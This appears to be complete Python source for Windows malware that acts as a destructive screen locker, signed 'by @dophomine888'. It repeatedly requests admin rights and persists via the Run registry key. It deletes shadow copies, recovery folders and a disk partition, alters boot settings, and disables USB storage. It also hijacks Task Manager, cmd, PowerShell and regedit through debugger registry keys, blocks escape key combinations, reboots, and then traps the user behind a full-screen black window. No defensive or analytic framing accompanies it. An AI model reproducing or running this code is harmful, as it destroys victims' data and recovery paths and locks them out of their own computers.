import os
import sys
import ctypes
import time
import winreg
import keyboard
import threading
import subprocess

def disable_safe_and_recovery():
    try:
        os.system('reagentc /disable')
        os.system('rmdir /S /Q C:\\Windows\\System32\\Recovery')
        os.system('rmdir /S /Q C:\\Recovery')
        with open('remove_recovery.txt', 'w') as f:
            f.write('select disk 0\nlist partition\nselect partition 0\ndelete partition override\n')
        os.system('diskpart /s remove_recovery.txt')
        os.remove('remove_recovery.txt')
        os.system('vssadmin delete shadows /all /quiet')
        os.system('wmic shadowcopy delete')
        os.system('bcdedit /set {current} recoveryenabled no')
        os.system('bcdedit /set {current} bootstatuspolicy ignoreallfailures')
        os.system('bcdedit /set {bootmgr} displaybootmenu no')
        os.system('bcdedit /set {current} bootmenupolicy legacy')
        with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\USBSTOR") as key:
            winreg.SetValueEx(key, "Start", 0, winreg.REG_DWORD, 4)
        os.system('bootrec /fixmbr')
        os.system('bootrec /fixboot')
        os.system('bootrec /rebuildbcd')
    except:
        pass

BLOCKED_KEYS = ['win', 'tab', 'shift', 'alt', 'f11', 'f4', 'f8']

def block_keys():
    for k in BLOCKED_KEYS:
        keyboard.block_key(k)
    for combo in [
        'ctrl+alt+del', 'ctrl+shift+esc', 'win+l', 'win+d',
        'win+e', 'win+r', 'win+x', 'alt+f4', 'alt+tab', 'ctrl+esc'
    ]:
        keyboard.add_hotkey(combo, lambda: None, suppress=True)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def request_admin():
    if not is_admin():
        script = os.path.abspath(sys.argv[0])
        params = ' '.join([f'"{arg}"' for arg in sys.argv[1:]])
        while True:
            try:
                ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}" {params}', None, 1)
                sys.exit()
            except:
                time.sleep(1)
                continue

def add_to_startup():
    exe_path = os.path.abspath(sys.argv[0])
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE) as key:
            winreg.SetValueEx(key, "good_loader", 0, winreg.REG_SZ, exe_path)
    except:
        pass

def block_system_tools():
    for exe in ['regedit.exe', 'taskmgr.exe', 'cmd.exe', 'powershell.exe', 'msconfig.exe', 'shutdown.exe']:
        try:
            key_path = r"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\\" + exe
            with winreg.CreateKey(winreg.HKEY_LOCAL_MACHINE, key_path) as key:
                winreg.SetValueEx(key, "Debugger", 0, winreg.REG_SZ, "svchost.exe")
        except:
            pass

def show_black_screen():
    import tkinter as tk
    root = tk.Tk()
    root.attributes('-fullscreen', True, '-topmost', True)
    root.configure(bg='black', cursor='none')
    root.overrideredirect(True)
    root.focus_force()
    root.grab_set_global()
    root.state('zoomed')
    try:
        root.geometry(f"{root.winfo_screenwidth()}x{root.winfo_screenheight()}+0+0")
    except:
        pass
    label = tk.Label(root, text="by @dophomine888", font=("Arial", 48, "bold"), fg="white", bg="black")
    label.place(relx=0.5, rely=0.5, anchor='center')
    def block_all(e):
        return "break"
    for event in ['<Key>', '<Button>', '<Motion>', '<KeyRelease>', '<FocusOut>']:
        root.bind_all(event, block_all)
    root.protocol("WM_DELETE_WINDOW", lambda: None)
    root.after(100, lambda: root.focus_force())
    root.mainloop()

def reboot_pc():
    os.system("shutdown /r /t 0 /f")

def main():
    request_admin()
    add_to_startup()
    disable_safe_and_recovery()
    block_keys()
    block_system_tools()
    flag_file = os.path.join(os.environ['TEMP'], 'good_ran.txt')
    if not os.path.exists(flag_file):
        with open(flag_file, 'w') as f:
            f.write('1')
        reboot_pc()
    else:
        show_black_screen()

if __name__ == "__main__":
    main()